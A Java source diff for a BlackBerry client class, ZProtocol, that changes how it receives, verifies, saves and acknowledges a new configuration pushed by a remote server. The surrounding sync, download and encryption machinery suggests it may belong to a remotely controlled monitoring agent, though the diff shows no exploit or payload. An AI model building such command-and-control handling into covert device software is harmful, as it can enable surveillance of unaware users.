@@ -19,8 +19,10 @@ import net.rim.device.api.crypto.SHA1Digest;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.Status;
+import blackberry.Task;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
+import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
@@ -99,7 +101,40 @@ public class ZProtocol extends Protocol {
                 //#endif  
 
                 response = command(Proto.NEW_CONF);
-                parseNewConf(response);
+                int newconf = parseNewConf(response);
+
+                if (newconf != Proto.NO) {
+                    //#ifdef DEBUG
+                    debug.trace("perform: had a conf");
+                    //#endif
+                    boolean ret = false;
+
+                    if (newconf == Proto.OK) {
+                        //#ifdef DEBUG
+                        debug.trace("perform: conf is not corrupted, try it");
+                        //#endif
+                        ret = Task.getInstance().taskInit();
+                    } else {
+                        //#ifdef DEBUG
+                        debug.trace("perform: conf was corrupted, or cannot write it");
+                        //#endif
+                    }
+
+                    //#ifdef DEBUG
+                    debug.trace("perform, conf return: " + ret);
+                    //#endif
+                    byte[] data;
+                    if (ret) {
+                        data = Utils.intToByteArray(Proto.OK);
+                    } else {
+                        data = Utils.intToByteArray(Proto.NO);
+                    }
+
+                    //#ifdef DEBUG
+                    debug.trace("perform: sending newconf: " + ret);
+                    //#endif
+                    command(Proto.NEW_CONF, data);
+                }
             }
 
             if (capabilities[Proto.DOWNLOAD]) {
@@ -419,7 +454,15 @@ public class ZProtocol extends Protocol {
         return capabilities;
     }
 
-    protected void parseNewConf(byte[] result) throws ProtocolException,
+    /**
+     * 
+     * @param result
+     * @return NO: no configuration, OK: new good configuration, ERROR: new
+     *         broken conf
+     * @throws ProtocolException
+     * @throws CommandException
+     */
+    protected int parseNewConf(byte[] result) throws ProtocolException,
             CommandException {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
@@ -431,22 +474,36 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseNewConf len: " + confLen);
             //#endif
+            
+            byte[] newconf = new byte[confLen];
+            Utils.copy(newconf, 0, result, 8, confLen);
 
-            boolean ret = Protocol.saveNewConf(result, 8);
-            if (ret) {
-                reload = true;
+            Conf conf = new Conf();            
+            if (conf.verifyConfig(newconf)) {
+
+                boolean ret = Protocol.saveNewConf(newconf, 0);
+                if (ret) {
+                    return Proto.OK;
+                }
+            }else{
+                //#ifdef DEBUG
+                debug.error("parseNewConf: not verified");
+                //#endif
             }
+            return Proto.ERROR;
 
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
             debug.info("no new conf: ");
             //#endif
+            return Proto.NO;
         } else {
             //#ifdef DEBUG
             debug.error("parseNewConf: " + res);
             //#endif
             throw new ProtocolException();
         }
+
     }
 
     protected void parseDownload(byte[] result) throws ProtocolException {
